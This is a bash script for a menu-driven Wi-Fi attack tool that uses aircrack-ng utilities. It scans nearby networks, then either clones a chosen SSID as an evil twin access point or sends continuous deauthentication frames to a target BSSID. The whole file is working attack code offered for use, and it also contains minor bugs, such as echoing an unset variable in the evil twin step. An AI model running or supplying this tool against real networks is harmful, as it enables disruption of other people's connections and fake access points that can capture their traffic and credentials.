#!/bin/bash

# Define the output file for airodump-ng scan results
OUTPUT_FILE="scan_results-01.csv"
OUTPUT="scan_results"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run this script as root (use sudo)."
    exit 1
fi

# Function to kill interfering processes before starting monitor mode
kill_interfering_processes() {
    echo "Killing interfering processes..."
    airmon-ng check kill
}

# Function to display available Wi-Fi interfaces
display_interfaces() {
    echo "Available Wi-Fi interfaces:"
    iw dev | grep -E 'Interface|wlan' | awk '{print $2}'
}

# Function to start the Wi-Fi interface in monitor mode
start_monitor_mode() {
    echo "Please select a Wi-Fi interface to use (e.g., wlan0):"
    read interface
    echo "Starting monitor mode on $interface..."
    airmon-ng start "$interface"
}

# Function to run airodump-ng for scanning nearby Wi-Fi networks
run_airodump() {
    # Ensure any previous scan result files are deleted
    if [ -f "$OUTPUT_FILE" ]; then
        echo "Deleting old scan results..."
        rm "$OUTPUT_FILE"
    fi
    
    echo "Available Wi-Fi interfaces:"
    iw dev | grep -E 'Interface|wlan' | awk '{print $2}'
    echo "Please select a Wi-Fi interface to use for the Attack (e.g., wlan0mon):"
    read interface

    echo "Please select the Wi-Fi frequency range (2.4 or 5):"
    read freq
    echo "The scan will run for 2 Minutes, Please be patient..."
    sleep 5
    echo "Running airodump-ng scan for nearby Wi-Fi networks..."

    # Start airodump-ng for 2 minutes
    if [ "$freq" == "2.4" ]; then
        airodump-ng "$interface" --band abg --write "$OUTPUT" --output-format csv &
    elif [ "$freq" == "5" ]; then
        airodump-ng "$interface" --band a --write "$OUTPUT" --output-format csv &
    else
        echo "Invalid frequency range. Please enter either 2.4 or 5."
        exit 1
    fi

    # Wait for 2 minutes (120 seconds)
    sleep 120
    # Kill the airodump-ng process
    pkill airodump-ng
    airmon-ng stop "$interface"
}

# Function to parse scan results and display Wi-Fi networks
parse_scan_results() {
    echo "Parsing the scan results..."
    echo "SSID | BSSID | Channel"
    awk -F, '{print $14 " | " $1 " | " $4}' "$OUTPUT_FILE" | tail -n +2
}

# Function to create Evil Twin (Fake AP) attack using airbase-ng
create_evil_twin() {
    echo "Enter the name of Wi-Fi network to clone:"
    read target_ssid
    echo "Enter the Channel of Wi-Fi network"
    read channel
    echo "Creating Evil Twin AP using SSID: $target_bssid"
    airbase-ng "$interface" -e "$target_ssid" -c "$channel" &
    echo "Evil Twin AP created. Press Ctrl+C to stop the attack."
}

# Function to perform Deauthentication attack using aireplay-ng
perform_deauth() {
    echo "Enter the BSSID of target Wi-Fi network to attack:"
    read target_bssid
    echo "Performing Deauthentication attack on BSSID: $target_bssid"
    aireplay-ng "$interface" --deauth 0 -a "$target_bssid" &
    echo "Deauthentication attack running. Press Ctrl+C to stop the attack."
}

# Function to scan for changes in nearby networks using airodump-ng
scan_for_changes() {
    echo "Scanning for nearby Wi-Fi networks again..."
    run_airodump
    parse_scan_results
}

# Main menu of the script
while true; do
    echo ""
    echo "Wi-Fi Attack and Scan Script"
    echo "1. Create Evil Twin AP"
    echo "2. Perform Deauthentication attack"
    echo "3. Scan for nearby Wi-Fi networks"
    echo "4. Exit"
    read -p "Please select an option (1/2/3/4): " option

    case $option in
        1)
            echo "Running Evil Twin attack..."
            kill_interfering_processes
            display_interfaces
            start_monitor_mode
            run_airodump
            parse_scan_results
            create_evil_twin
            ;;
        2)
            echo "Running Deauthentication attack..."
            kill_interfering_processes
            display_interfaces
            start_monitor_mode
            run_airodump
            parse_scan_results
            perform_deauth
            ;;
        3)
            echo "Running scan for nearby Wi-Fi networks..."
            kill_interfering_processes
            display_interfaces
            start_monitor_mode
            run_airodump
            parse_scan_results
            ;;
        4)
            echo "Exiting script."
            airmon-ng stop "$interface"
            systemctl start NetworkManager
            exit 0
            ;;
        *)
            echo "Invalid option. Please select 1, 2, 3, or 4."
            ;;
    esac
done

